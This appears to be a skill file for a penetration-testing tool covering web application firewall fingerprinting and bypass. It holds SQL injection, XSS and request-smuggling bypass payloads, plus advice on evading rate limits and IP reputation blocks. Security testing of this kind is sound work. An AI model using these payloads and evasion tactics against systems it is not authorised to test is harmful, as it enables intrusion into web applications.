---
name: waf_detection_bypass
description: "Web Application Firewall detection and bypass techniques"
triggers:
  - waf
  - web application firewall
  - bypass
  - firewall
  - modsecurity
  - cloudflare
  - akamai
  - imperva
  - detection evasion
metadata:
  category: waf
  tools: [waf]
  scope: targets
---

## Overview

WAF detection identifies protective firewalls and their rules. Bypass techniques test for weaknesses in WAF rule sets using encoded payloads, obfuscation, and protocol-level attacks.

## Capabilities

- WAF vendor identification (Cloudflare, Akamai, Imperva, etc.)
- Rule set fingerprinting
- Detection evasion using encoding
- Protocol-level attacks
- HTTP smuggling techniques
- Header manipulation
- Case sensitivity bypass
- SQLi bypass patterns
- XSS bypass patterns

## Usage

### Detect WAF

```bash
eggsec waf detect --target https://example.com
```

### Bypass Testing

```bash
eggsec waf bypass --target https://example.com --waf cloudflare
```

### Full WAF Assessment

```bash
eggsec waf stress --target https://example.com --payload-type sqli
```

## WAF Fingerprints

| WAF | Detection Patterns |
|-----|-------------------|
| Cloudflare | cf-ray, __cfduid cookie, Challenge page |
| Akamai | akamai-hosted, X-Akamai-* headers |
| Imperva | incapsula, VISID cookie |
| ModSecurity | 501 Not Implemented, 405 Method Not Allowed |
| AWS WAF | aws-waf-token cookie |
| F5 ASM | TScookie, __jsflood |

## Bypass Techniques

**Case Manipulation:**
```sql
UniOn SeLeCt
<scrIPT>alert(1)</scrIPT>
```

**Encoding:**
```html
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```

**Comment Injection:**
```sql
admin'/**/or/**/'1'='1
<script>/*--><svg/onload=alert(1)>-->
```

**Protocol:**
```http
Transfer-Encoding: chunked
Content-Length: 0
```

## Triggers

Keywords: waf, firewall, bypass, detect, cloudflare, akamai, imperva, modsecurity, rule, evasion, obfuscate, encoding, payload, sqli, xss, firewall bypass

## Best Practices

1. Always detect WAF before fuzzing to choose correct payloads
2. Use minimal payloads first to avoid triggering permanent blocks
3. Check for WAF version and known bypass techniques
4. Use slow attacks to avoid rate-based blocking
5. Test multiple IPs to avoid reputation-based blocking